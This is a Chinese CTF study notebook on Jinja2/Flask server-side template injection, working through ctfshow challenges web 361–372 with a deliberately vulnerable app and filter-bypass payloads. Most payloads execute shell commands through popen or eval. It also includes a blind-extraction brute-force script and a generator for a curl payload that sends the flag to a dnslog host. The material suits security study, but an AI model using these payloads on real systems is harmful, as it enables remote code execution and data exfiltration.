# SSTI(Server-Side Template Injection)

## 参考文章

:::info
写在前面

- **这做题一定要在本地多试，试试就知道为啥有的命令不行了**
  :::
  [细说Jinja2之SSTI&bypass - 合天网安实验室 - 博客园](https://www.cnblogs.com/hetianlab/p/14154635.html)<br />[flask之ssti模版注入从零到入门 - 先知社区](https://xz.aliyun.com/t/3679)<br />[SSTI模板注入绕过（进阶篇）_yu22x的博客-CSDN博客_ssti绕过](https://blog.csdn.net/miuzzx/article/details/110220425)<br />[CTFSHOW SSTI篇_yu22x的博客-CSDN博客_ctfshow ssti](https://blog.csdn.net/miuzzx/article/details/112168039)

## SSTI漏洞成因

### 模板引擎

- 拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器

#### 后端渲染

- 后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的
- 后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。

#### 前端渲染

- 前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，
- 好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。

### SSTI(服务端模板注入)

- 有点像sql注入，服务器信任用户的输入，我传进去的代码`{{7*7}}`被执行了

#### route路由

```python
@app.route('/')
def test()"
   return 123
```

- 访问127.0.0.1:5000/则会输出123

**设置动态网址**

```python
@app.route("/hello/<username>")
def hello_user(username):
  return "user:%s"%username
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675996057127-ac4d2d55-5ec1-4942-8499-1bc4810685ef.png#averageHue=%23efeeed&clientId=u299d245d-6368-4&from=paste&height=122&id=u2933c79f&originHeight=244&originWidth=849&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28868&status=done&style=none&taskId=u65610fe1-1e2c-43fe-a2be-206e58f74c5&title=&width=424.5)

#### main入口

```python
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
```

- 开启debug后`app.debug = True`，修改代码的时候直接保存，网页刷新就可以了。
- 不用一次一次重启服务器

#### 模板渲染

:::info
├── app.py   <br />├── static   <br />│   └── style.css   <br />└── templates       <br />└── index.html
:::

- render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量
- 写一个index.html文件写templates文件夹中

```html
<html>
  <head>
    <title>{{title}} - 小猪佩奇</title>
  </head>
 <body>
      <h1>Hello, {{user.name}}!</h1>
  </body>
</html>
```

- 里面有两个参数需要我们渲染，user.name，以及title
- 在app.py文件里进行渲染

```python
@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转
def index():
   user = {'name': '小猪佩奇'}#传入一个字典数组
   return render_template("index.html",title='Home',user=user)
```

- 这里没有任何过滤，所以就会造成问题

### flask实战

- 一段有漏洞的代码：

```python
● 
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string

app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def index():
    name = request.args.get('name')
    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
        '''% (name)
    return render_template_string(template)

if __name__ == '__main__':
    app.debug = True
    app.run()
```

- 这里用了`% (name)`，也就是会把用户的输入直接在前端显示结果，没有过滤下·

## 常用脚本

- 寻找类及下标

```python
import json

a = """
[<class 'type'>,..........,<class 'contextlib._BaseExitStack'>]
"""    #将一大堆类结果复制到这儿

num = 0
allList = []

result = ""
#下面的目的是把字典中的数据放入list中，result是查询的单个结果
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if "system" in v:       #在类中寻找‘system’类，注意区分大小写！
        print(str(k)+"--->"+v)
```

- 寻找函数脚本

```python
#寻找函数脚本：

import json 
search ='popen'     #在类中寻找popen函数
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try :
        if search in i.__init__.__globals__.keys():
            print(i,num)
    except:
        pass
```

## web 361

- 找`os._wrap_close`这个类，用脚本跑
- 找到位置后用下面的Payload

```python
{{"".__class__.__bases__[0].__subclasses__()[位置].__init__.__globals__['popen']('cat /flag').read()}}
```

## web 362

### 方法1：url_for

- 利用视图函数名字一般不会改变的特性，利用视图函数的名字去动态精准的获取url

```python
from flask import Flask, url_for
 
app = Flask(__name__)
app.config.update(DEBUG=True)
 
 
@app.route('/')
def demo1():
    print(url_for("book"))  # 注意这个引用的是视图函数的名字 字符串格式,就是下面的book函数，
    print(type(url_for("book")))
 
    return url_for("book")
 
 
@app.route('/book_list/')
def book():
    return 'flask_book'
 
 
if __name__ == "__main__":
    app.run()
```

- 终端中打印的结果为：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676014020303-cb098f20-e314-465d-8da7-5e310058f40d.png#averageHue=%23282726&clientId=u34e1e24c-4d73-4&from=paste&height=51&id=O21WG&originHeight=102&originWidth=383&originalType=binary&ratio=2&rotation=0&showTitle=false&size=6034&status=done&style=none&taskId=u02355a58-6c7a-4120-83b3-c6db6eb57c9&title=&width=191.5)

#### payload1

```python
?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```

#### payload2

- 也可以不用__builtins__，直接用os

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676016681161-ade63a58-28c8-4c96-969e-c99026af5407.png#averageHue=%23edeceb&clientId=u34e1e24c-4d73-4&from=paste&height=55&id=u140b4125&originHeight=109&originWidth=1127&originalType=binary&ratio=2&rotation=0&showTitle=false&size=12675&status=done&style=none&taskId=uc50bc29d-7268-45cb-a6d3-35a62a5386b&title=&width=563.5)

```python
url_for.__globals__['os']['poen']('cat /flag').read()
```

### 方法2：x.__init__

- x是任意26个英文字母的任意组合都可以，同样可以得到__builtins__然后用eval就可以了

```python
?name={{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```

- `x.__init__.__globals__`是有`'__builtins'`这个属性的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676015314568-46af4a07-b230-4bb6-98da-5d35fa76f4b3.png#averageHue=%23e0dfdc&clientId=u34e1e24c-4d73-4&from=paste&height=553&id=ubc8e4ffa&originHeight=1106&originWidth=2608&originalType=binary&ratio=2&rotation=0&showTitle=false&size=380100&status=done&style=none&taskId=u1f9c57b9-a2a6-4b2a-8271-a10b149e27b&title=&width=1304)

- `x.__init__.__globals__['__builtins__']`中存在eval

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676015409509-c60dd2f9-3541-4149-b29d-b41de336e7b4.png#averageHue=%23e1dfdd&clientId=u34e1e24c-4d73-4&from=paste&height=560&id=ud20ce8d8&originHeight=1120&originWidth=2744&originalType=binary&ratio=2&rotation=0&showTitle=false&size=375372&status=done&style=none&taskId=ued0ec0da-ea4a-477c-84dc-a0d3713f81d&title=&width=1372)

### 方法3：{% %}

- **{% %}**主要用来声明变量，也可以用于条件语句和循环语句。

```python
{% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}
```

## web 363(过滤单引号)

- request绕过 包括get post cookie
  :::info

1. get传参：request.args.name 
2. cookie传参：request.cookies.name
3. post传参：request.values.name
   :::

### 方法1：url_for

#### __builtins

```python
?a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()&name={{u
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           rl_for.__globals__[request.args.a][request.args.b](request.args.c)}}
```

### os

```python
a=os&b=popen&c=cat /flag&name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}
```

## web 365(过滤中括号[])

:::info

1. **点绕过：**对于globals中的属性可以用`.`代替中括号访问

即：`url_for.__globals__.os`

2. **getitem绕过：**对于元组来说，可以用getitem(位置）进行访问，getitem还可以直接获取元素
   :::

```python
?name={{x.__init__.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)}}

Cookie传参：x2=__import__('os').popen('cat /f*').read();x1=__builtins__
```

## web 366(过滤下划线_)

### 方法1：16进制编码

:::info

- 该方法需要在每组外加中括号[]，所以当过滤`[]或"`时，不能用这种方法
- 可以只对下划线编码，也可以对class这种也编码
  :::
  ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676031008980-d746d958-9335-4b4e-a040-8ae25f1d2139.png#averageHue=%23f9f9f8&clientId=u0c8a6e56-873f-4&from=paste&height=227&id=ua3481a6f&originHeight=454&originWidth=1974&originalType=binary&ratio=2&rotation=0&showTitle=false&size=70361&status=done&style=none&taskId=u3f2cc343-56dd-4c5b-ae81-cfd27fc7ae2&title=&width=987)

```python
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()}}
```

- 第一个的`()`也可以换成`""`

### 方法2：attr+request

[SSTI模板注入绕过（进阶篇）_yu22x的博客-CSDN博客_ssti 关键词绕过](https://blog.csdn.net/miuzzx/article/details/110220425)

- 它是一种过滤器，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数
  :::info
  Get an attribute of an object. `foo|attr("bar")` works like foo.bar just that always an attribute is returned and items are not looked up.
  :::

```python
""|attr("__class__")
相当于
"".__class__

```

- 也就是括号内的东西是前面的属性

#### payload

- 根据前面的payload

```python
?name={{x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)(request.cookies.d)|attr(eval(request.cookies.e))}}
a=__init__&b=__globals__&c=__getitem__&d=__builtins__&e=__import__('os').popen('cat /f*').read()
```

### 方法3：lipsum

- lipsum.__globals__['__builtins__']
- lipsum的globals中有os，有builtins

```python
name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
传参：a=__globals__;b=cat /f*
```

:::danger

- 这里我不明白为什么一定要用attr，不能用`.`
- 且要注意最前面有括号，把lipsum的东西当成一个整体
  :::

## web 367(get)

:::info

- 注意不能直接`(lipsum|attr(request.cookies.a)).(request.cookies.b)`，这样会报错，要用**get**
- **不理解为什么也不能用attr**
  :::

```python
(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()

a=__globals__&b=os&c=cat /flag
```

## web 368(过滤{{)

### 方法1：{%%}

:::info

- 用`**{%%}**`绕过
  :::

```python
{%print((lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read())%}

a=__globals__&b=os&c=cat /flag
```

### 方法2：盲注绕过

:::info

- `open('/flag').read()`是回显整个文件
- read函数里加上参数：`open('/flag').read(1)`,返回的就是读出所读的文件里的i个字符
  :::

```python
import requests

url="http://3db27dbc-dccc-46d0-bc78-eff3fc21af74.chall.ctf.show:8080/"
flag=""
for i in range(1,100):
    for j in "abcdefghijklmnopqrstuvwxyz0123456789-{}":
        params={
            'name':"{{% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read({}) %}}{{% if a==request.values.d %}}feng{{% endif %}}".format(i),
            'a':'__globals__',
            'b':'__builtins__',
            'c':'/flag',
            'd':f'{flag+j}'
        }
        r=requests.get(url=url,params=params)
        if "feng" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break


```

## web 369(过滤request)

### 拼接字符串

#### join

- 拼接字符串

```python
var1 = "Hello"
var2 = "World"
 
# join() method is used to combine the strings
print("".join([var1, var2]))

#输出HelloWorld

# join() method is used here to combine
# the string with a separator Space(" ")
var3 = " ".join([var1, var2])
 
print(var3)

#输出Hello World
```

```python
var3 = dict(po=1,p=2)
print("".join(var3))
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676086105844-cd1e3c1f-ec6c-444f-a385-6232de0ce212.png#averageHue=%23212120&clientId=uef09e2d1-bf88-4&from=paste&height=32&id=u4895a3c5&originHeight=64&originWidth=313&originalType=binary&ratio=2&rotation=0&showTitle=false&size=2954&status=done&style=none&taskId=ua1c0713f-94b3-4826-a54f-8c634852e21&title=&width=156.5)

#### ~

- 拼接字符串

```python
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}

#意思就是{{""['__class__']}}
```

- 输出结果为：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676102172951-6bcffeb9-c621-4b68-bd58-2bfa99eddfdb.png#averageHue=%23ecebea&clientId=u34133bce-2d15-4&from=paste&height=41&id=z1SuT&originHeight=82&originWidth=450&originalType=binary&ratio=2&rotation=0&showTitle=false&size=5299&status=done&style=none&taskId=uec11d7b0-38de-4c86-9fcd-eed025dec61&title=&width=225)

#### %2b

```python
name={%set a='_'%}{% set ini=a%2ba%2b'class'%2ba%2ba%}{%print(ini)%}
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676104111199-35a1f893-2863-43db-8ec8-21761613c029.png#averageHue=%23f5f4f4&clientId=u34133bce-2d15-4&from=paste&height=63&id=uc0f6cdf0&originHeight=126&originWidth=408&originalType=binary&ratio=2&rotation=0&showTitle=false&size=4254&status=done&style=none&taskId=u82c5368d-5a5b-4440-a333-2cb6105e3d6&title=&width=204)

### payload

:::info
这题过滤了request，只能拼接字符<br />`~ 和 join`都可以拼接字符

- **在得到**`**/flag**`**后，用**`**open('/flag')**`**打开，这个之前不知道**
- **%2b应该也是字符串拼接**
  :::

**拿出一句分析一下：**

```python
#后面没有join
{%set a='_'%}{% set ini=(a,a,dict(init=a)|join,a,a)%}{%print(ini)%}

#后面有join
{%set a='_'%}{% set ini=(a,a,dict(init=a)|join,a,a)|join%}{%print(ini)%}
```

- 没有join的输出

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676102802367-0a31bf8b-f55e-4451-ac6b-723b4e6feadf.png#averageHue=%23f4f3f3&clientId=u34133bce-2d15-4&from=paste&height=50&id=ud8fefee4&originHeight=99&originWidth=621&originalType=binary&ratio=2&rotation=0&showTitle=false&size=5169&status=done&style=none&taskId=u1dbb5f59-9544-4448-bb8e-de484226c14&title=&width=310.5)

- 有join的输出

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676102860492-a5e3a272-6044-4e81-812a-9af30f07ecef.png#averageHue=%23f9f9f9&clientId=u34133bce-2d15-4&from=paste&height=82&id=u5d3be2e1&originHeight=164&originWidth=525&originalType=binary&ratio=2&rotation=0&showTitle=false&size=3611&status=done&style=none&taskId=u2ec9b8e4-2482-4a6d-b1ea-ae32d4cade5&title=&width=262.5)
:::info
总结：

1. 第一个join只是拼接dict中的key
2. 第二个join是把整体拼接在一起
3. 最后一个join后可以没有`()`
   :::

```python
?name=
{% set po=dict(po=a,p=a)|join%}#po = pop
{% set a=(()|select|string|list)|attr(po)(24)%}#pop 24是下划线_
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}#__init__
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}#__globals__
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}#__getitem__
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}#__builtins__
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}#x=q.__init__.__globals__.['__builtins__']
{% set chr=x.chr%}		#获取chr
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}	#拼接/flag
{%print(x.open(file).read())%}	#打开flag
```

- 上面的`%2b`也可以用`~`

```python
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
```

- 也可以用join

```python
{% set file=(chr(47),chr(102),chr(108),chr(97),chr(103))|join%}
```

## web 370(过滤数字)

:::info

1. 过滤数字就想办法找到可以数字母个数的函数
2. `count`或者`length`都可以
3. **其实这些思想前面都有，需要好好总结一下**
   :::

```python
?name=
{% set c=(dict(e=a)|join|count)%}
{% set cc=(dict(ee=a)|join|count)%}
{% set ccc=(dict(eee=a)|join|count)%}
{% set cccc=(dict(eeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set coun=(cc~cccc)|int%}
#构成了从1-10的数字，替换前面payload的数字就可以了
```

## web 371(过滤print)

:::info
**之前的构造：**

- 之前是找到`__builtins__`中的`chr`，之后构造`cat /flag`，`print(open(file))`

现在不能open了，翻到最开始的命令<br />`?name={{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}`

- 最后是eval，eval中的命令在无回显时可以用**curl带出，或者反弹shell，开启监听**
  :::

```python
{% set c=(t|count)%}
{% set cc=(dict(e=a)|join|count)%}
{% set ccc=(dict(ee=a)|join|count)%}
{% set cccc=(dict(eee=a)|join|count)%}
{% set ccccc=(dict(eeee=a)|join|count)%}
{% set cccccc=(dict(eeeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}
{% set coun=(ccc~ccccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=
%}
{%if x.eval(cmd)%}
abc
{%endif%}
```

- 上面这段代码用一个字母`c`的时候表示数字0，2个字母`c`的时候表示数字2
- `chr`是通过ASCII码获取字符，`chr(95)`得到的字符是`_`
- cmd通过下面的代码生成

```python
def aaa(t):
	t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'
	return t
s='__import__("os").popen("curl `cat /flag`.du9dan.dnslog.cn").read()'
def ccchr(s):
	t=''
	for i in range(len(s)):
		if i<len(s)-1:
			t+='chr('+aaa(str(ord(s[i])))+')%2b'#ord获取ASCII码，str转字符串
  
		else:
			t+='chr('+aaa(str(ord(s[i])))+')'
	return t
if __name__ == '__main__':  
    print(ccchr(s))

```

- `(int(t[:-1:])+1)`是取字符ASCII码的最后一位之前的部分
- `_`的ASCII码是95，就需要`10个c + 6个c`，因为10个`c`表示9

## web 372(过滤count)

- 用length替代，作用等同于count

## 扩展：全角字符代替半角字符

:::info

- 过滤数字的题可以用这种方式秒杀
  :::

### 全角 vs 半角

1. 全角：是一种电脑字符，一个全角字符占两个字节。

- 汉字字符和规定了全角的英文字符及国标GB2312-80中的图形符号和特殊字符都是全角字符。
- 在全角中，字母和数字等与汉字一样占据着等宽的位置。
- 汉语、日语、及朝鲜文等象形字语言的字库量远大于256个编码空间，所以改用两个字节来储存。

2. 半角：是指一个字符占用一个标准的字符位置。半角占一个字节。英文就是半角

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676272482837-70d7d2bf-b0a3-44be-98ec-97527a9c7a7f.png#averageHue=%23fdfcfc&clientId=u0c341530-6213-4&from=paste&height=213&id=u40fdfb9e&originHeight=425&originWidth=1105&originalType=binary&ratio=2&rotation=0&showTitle=false&size=59287&status=done&style=none&taskId=ufa180c8b-9e4c-42ca-9261-cbb01b33f51&title=&width=552.5)

### 全角和半角的转换

[http://www.yuxang.com/%E5%85%A8%E8%A7%92%E5%92%8C%E5%8D%8A%E8%A7%92%E7%9A%84%E5%8C%BA%E5%88%86/](http://www.yuxang.com/%E5%85%A8%E8%A7%92%E5%92%8C%E5%8D%8A%E8%A7%92%E7%9A%84%E5%8C%BA%E5%88%86/)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676272631546-43852125-2bf5-4869-bd1a-817f84bcd25e.png#averageHue=%23fcfbfb&clientId=u0c341530-6213-4&from=paste&height=715&id=udf297a17&originHeight=1430&originWidth=1643&originalType=binary&ratio=2&rotation=0&showTitle=false&size=115638&status=done&style=none&taskId=ueb782d8b-ed2e-46fa-9276-5fda9d0fb6d&title=&width=821.5)

- 可以看到全角字符中数字的Unicode码值减半角字符的Unicode码值的结果为

![](https://cdn.nlark.com/yuque/__latex/93ac8c14a948a9381b3954bcb9c352ac.svg#card=math&code=ff10-0030%3Dfee0&id=XEr7p)

- 所以转换脚本为：

```python
def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)
```

## SSTI总结

![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1677161451974-5c69b8e6-ba53-4ec0-9ddc-9ba86f08aee6.jpeg)